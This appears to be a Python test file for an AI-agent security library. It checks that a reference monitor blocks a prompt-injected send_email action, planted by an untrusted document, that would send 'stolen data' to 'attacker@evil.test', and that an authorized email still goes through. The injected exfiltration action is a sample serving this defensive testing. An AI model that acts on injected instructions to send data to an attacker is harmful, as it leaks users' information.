from pathlib import Path

from vais import (
    DecisionType,
    PlannedAction,
    ProtectedExecutor,
    Provenance,
    ReferenceMonitor,
    SandboxExecutor,
    SecurityInvariant,
    TaskContract,
    TrustLevel,
    TrustedValue,
    Value,
    VerifiableReward,
    load_policy,
)

ROOT = Path(__file__).resolve().parents[1]


def test_blocked_injection_produces_no_effect_and_no_reward():
    policy = load_policy(ROOT / "policies" / "default.yaml")
    protected = ProtectedExecutor(ReferenceMonitor(policy), SandboxExecutor())
    contract = TaskContract(
        allowed_tools={"send_email"},
        granted_scopes={"email:send"},
        bound_arguments={("send_email", "recipient"): TrustedValue("alice@example.com", "user")},
    )
    attacked = PlannedAction(
        "send_email",
        {
            "recipient": Value("attacker@evil.test", Provenance("document", TrustLevel.UNTRUSTED)),
            "body": Value("stolen data", Provenance("document", TrustLevel.DERIVED_UNTRUSTED)),
        },
    )

    records = protected.run([attacked], contract)
    assert records[0].decision.type == DecisionType.DENY
    assert records[0].effect is None

    rewarder = VerifiableReward(
        [
            SecurityInvariant(
                "recipient_integrity",
                "No email to attacker",
                lambda e: e.kind == "email_sent" and e.attributes.get("recipient") == "attacker@evil.test",
            )
        ]
    )
    effects = [r.effect for r in records if r.effect is not None]
    reward, violations = rewarder.evaluate(effects)
    assert reward == 0.0
    assert violations == ()


def test_authorized_action_executes():
    policy = load_policy(ROOT / "policies" / "default.yaml")
    protected = ProtectedExecutor(ReferenceMonitor(policy), SandboxExecutor())
    contract = TaskContract(
        allowed_tools={"send_email"},
        granted_scopes={"email:send"},
        bound_arguments={("send_email", "recipient"): TrustedValue("alice@example.com", "user")},
    )
    action = PlannedAction(
        "send_email",
        {
            "recipient": TrustedValue("alice@example.com", "user"),
            "body": Value("summary", Provenance("summary", TrustLevel.DERIVED_UNTRUSTED)),
        },
    )

    records = protected.run([action], contract)
    assert records[0].decision.type == DecisionType.ALLOW
    assert records[0].effect is not None
    assert records[0].effect.kind == "email_sent"
